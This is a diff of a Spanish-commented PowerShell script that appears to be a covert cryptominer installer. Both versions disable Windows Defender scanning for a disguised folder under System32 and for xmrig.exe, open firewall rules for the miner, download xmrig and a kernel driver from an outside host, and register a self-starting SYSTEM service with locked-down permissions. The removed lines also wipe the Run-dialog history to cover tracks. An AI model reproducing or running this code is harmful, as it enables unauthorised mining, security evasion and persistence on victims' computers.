@@ -8,7 +8,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-# Configuración de ejecución para evitar errores
+# Configuración de ejecución
 $ErrorActionPreference = "Stop"
 Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 
@@ -16,14 +16,7 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 $baseURL = "https://baa4ts.is-a-good.dev"
 
 # Definir rutas
-$root = Join-Path $env:WINDIR "System32"
-$root = Join-Path $root "LogFiles"
-$root = Join-Path $root "WNMA"
-
-$xmrig = Join-Path $root "xmrig.exe"
-$Win2 = Join-Path $root "Win2Internals.exe"
-$wroom = Join-Path $root "wroom.dll"
-$WinRing = Join-Path $root "WinRing0x64.sys"
+$root = Join-Path $env:WINDIR "System32\LogFiles\WNMA"
 
 Write-Host "Iniciando script de configuración..." -ForegroundColor Green
 
@@ -38,131 +31,114 @@ try {
     Write-Host "Estableciendo variable de entorno..." -ForegroundColor Yellow
     [Environment]::SetEnvironmentVariable("WINUSERNAME", $env:USERNAME, "Machine")
 
-    # Agregar exclusiones de Windows Defender
-    Write-Host "Agregando exclusiones de Windows Defender..." -ForegroundColor Yellow
-
-    # Cuenta que puede modificar todo (tu software)
-    $serviceAccount = "NT AUTHORITY\SYSTEM"
+    # Configurar permisos de la carpeta
+    Write-Host "Configurando permisos..." -ForegroundColor Yellow
     
-    # --- Objetos de seguridad ---
-    $everyone = New-Object System.Security.Principal.NTAccount("Everyone")
-    $serviceAcct = New-Object System.Security.Principal.NTAccount($serviceAccount)
-    
-    # Derechos para Everyone: solo lectura y ejecución
-    $readExecuteRights = [System.Security.AccessControl.FileSystemRights]"ReadAndExecute, Synchronize"
-    
-    # Herencia: contenedores y objetos
-    $inheritance = [System.Security.AccessControl.InheritanceFlags]::ContainerInherit -bor `
-                   [System.Security.AccessControl.InheritanceFlags]::ObjectInherit
-    
-    $propagation = [System.Security.AccessControl.PropagationFlags]::None
-    
-    # Crear regla para Everyone
-    $allowReadExecute = New-Object System.Security.AccessControl.FileSystemAccessRule(
-        $everyone,
-        $readExecuteRights,
-        $inheritance,
-        $propagation,
-        [System.Security.AccessControl.AccessControlType]::Allow
-    )
-    
-    # Crear regla para el servicio: control total
-    $fullControlRights = [System.Security.AccessControl.FileSystemRights]::FullControl
-    $allowFullControl = New-Object System.Security.AccessControl.FileSystemAccessRule(
-        $serviceAcct,
-        $fullControlRights,
-        $inheritance,
-        $propagation,
-        [System.Security.AccessControl.AccessControlType]::Allow
-    )
-    
-    # Obtener ACL y limpiar reglas conflictivas de Everyone
+    # Obtener ACL actual
     $acl = Get-Acl -Path $root
-    $acl.Access | Where-Object { $_.IdentityReference -eq $everyone } | ForEach-Object {
-        $acl.RemoveAccessRule($_)
-    }
     
-    # Agregar nuevas reglas
-    $acl.AddAccessRule($allowReadExecute)
-    $acl.AddAccessRule($allowFullControl)
+    # Regla para Everyone (Lectura y Ejecución)
+    $everyoneRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+        "Everyone",
+        "ReadAndExecute",
+        "ContainerInherit,ObjectInherit",
+        "None",
+        "Allow"
+    )
     
-    # Aplicar ACL
+    # Regla para SYSTEM (Control Total)
+    $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+        "NT AUTHORITY\SYSTEM",
+        "FullControl",
+        "ContainerInherit,ObjectInherit",
+        "None",
+        "Allow"
+    )
+    
+    # Aplicar reglas
+    $acl.SetAccessRule($everyoneRule)
+    $acl.SetAccessRule($systemRule)
     Set-Acl -Path $root -AclObject $acl
+
+    # Configurar exclusiones de Windows Defender
+    Write-Host "Configurando exclusiones de Windows Defender..." -ForegroundColor Yellow
     
-    Write-Host "Permisos aplicados correctamente: $serviceAccount puede modificar, Everyone solo lectura/ejecución."
-    
-    # Verificar si el módulo de Defender está disponible
-    if (Get-Module -ListAvailable -Name Defender) {
-        Import-Module Defender -ErrorAction SilentlyContinue
-        
-        # Exclusiones de path (solo la carpeta raíz es necesaria)
+    try {
         Add-MpPreference -ExclusionPath $root -ErrorAction SilentlyContinue
-        
-        # Exclusiones de procesos
         Add-MpPreference -ExclusionProcess "xmrig.exe" -ErrorAction SilentlyContinue
         Add-MpPreference -ExclusionProcess "Win2Internals.exe" -ErrorAction SilentlyContinue
-        
-        Write-Host "Exclusiones agregadas correctamente." -ForegroundColor Green
-    } else {
-        Write-Host "Módulo de Defender no disponible, omitiendo exclusiones." -ForegroundColor Yellow
+    }
+    catch {
+        Write-Host "Advertencia: No se pudieron configurar todas las exclusiones de Defender" -ForegroundColor Yellow
     }
 
-    # Configurar reglas de firewall
-    Write-Host "Configurando reglas de firewall..." -ForegroundColor Yellow
+    # Configurar firewall
+    Write-Host "Configurando firewall..." -ForegroundColor Yellow
     
-    # Eliminar reglas existentes si existen
-    Remove-NetFirewallRule -DisplayName "Entrada XMRIG" -ErrorAction SilentlyContinue
-    Remove-NetFirewallRule -DisplayName "Salida XMRIG" -ErrorAction SilentlyContinue
-    
-    # Crear nuevas reglas
-    New-NetFirewallRule -DisplayName "Entrada XMRIG" -Direction Inbound -Program $xmrig -Action Allow -Profile Any -ErrorAction SilentlyContinue
-    New-NetFirewallRule -DisplayName "Salida XMRIG" -Direction Outbound -Program $xmrig -Action Allow -Profile Any -ErrorAction SilentlyContinue
+    try {
+        # Eliminar reglas existentes
+        Remove-NetFirewallRule -DisplayName "Entrada XMRIG" -ErrorAction SilentlyContinue
+        Remove-NetFirewallRule -DisplayName "Salida XMRIG" -ErrorAction SilentlyContinue
+
+        # Crear nuevas reglas
+        New-NetFirewallRule -DisplayName "Entrada XMRIG" -Direction Inbound -Program "$root\xmrig.exe" -Action Allow -ErrorAction SilentlyContinue
+        New-NetFirewallRule -DisplayName "Salida XMRIG" -Direction Outbound -Program "$root\xmrig.exe" -Action Allow -ErrorAction SilentlyContinue
+    }
+    catch {
+        Write-Host "Advertencia: Error en configuración de firewall" -ForegroundColor Yellow
+    }
 
     # Descargar archivos
     Write-Host "Descargando archivos..." -ForegroundColor Yellow
     
-    $files = @{
-        "Win2Internals.exe" = $Win2
-        "WinRing0x64.sys" = $WinRing
-        "wroom.dll" = $wroom
-        "xmrig.exe" = $xmrig
-    }
+    $files = @(
+        "Win2Internals.exe",
+        "WinRing0x64.sys",
+        "wroom.dll",
+        "xmrig.exe"
+    )
 
-    foreach ($file in $files.GetEnumerator()) {
+    foreach ($file in $files) {
         try {
-            Write-Host "Descargando $($file.Key)..." -ForegroundColor Gray
-            Invoke-WebRequest -Uri "$baseURL/$($file.Key)" -OutFile $file.Value -UseBasicParsing
+            $filePath = Join-Path $root $file
+            Write-Host "Descargando $file..." -ForegroundColor Gray
+            Invoke-WebRequest -Uri "$baseURL/$file" -OutFile $filePath -UseBasicParsing
         }
         catch {
-            Write-Host "Error al descargar $($file.Key): $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "Error al descargar $file" -ForegroundColor Red
         }
     }
 
-    # Crear el servicio
+    # Configurar servicio
     Write-Host "Configurando servicio..." -ForegroundColor Yellow
     
-    # Detener y eliminar servicio si existe
-    sc.exe stop Win2Internals 2>$null
-    sc.exe delete Win2Internals 2>$null
-    
-    # Crear nuevo servicio
-    sc.exe create Win2Internals binPath= "$Win2" start= auto obj= "LocalSystem" type= own
-    sc.exe sdset Win2Internals "D:(A;;GA;;;SY)(A;;GA;;;BA)"
-    
-    # Iniciar servicio
-    sc.exe start Win2Internals
+    try {
+        $serviceName = "Win2Internals"
+        $servicePath = Join-Path $root "Win2Internals.exe"
+        
+        # Detener y eliminar servicio si existe
+        if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
+            Stop-Service $serviceName -Force -ErrorAction SilentlyContinue
+            sc.exe delete $serviceName | Out-Null
+        }
 
-    # Limpiar historial de ejecución
-    Write-Host "Limpiando registro..." -ForegroundColor Yellow
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
-    Remove-ItemProperty -Path $regPath -Name * -Force -ErrorAction SilentlyContinue
+        # Crear nuevo servicio
+        sc.exe create $serviceName binPath= "$servicePath" start= auto obj= "LocalSystem" type= own
+        sc.exe sdset $serviceName "D:(A;;GA;;;SY)(A;;GA;;;BA)"
+        
+        # Iniciar servicio
+        Start-Service $serviceName -ErrorAction SilentlyContinue
+    }
+    catch {
+        Write-Host "Error en configuración del servicio: $($_.Exception.Message)" -ForegroundColor Red
+    }
 
     Write-Host "Configuración completada exitosamente!" -ForegroundColor Green
 }
 catch {
     Write-Host "Error durante la ejecución: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "En la línea: $($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Red
 }
-
-# Restaurar política de ejecución
-Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope Process -Force
+finally {
+    # Restaurar política de ejecución
+    Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope Process -Force -ErrorAction SilentlyContinue
+}
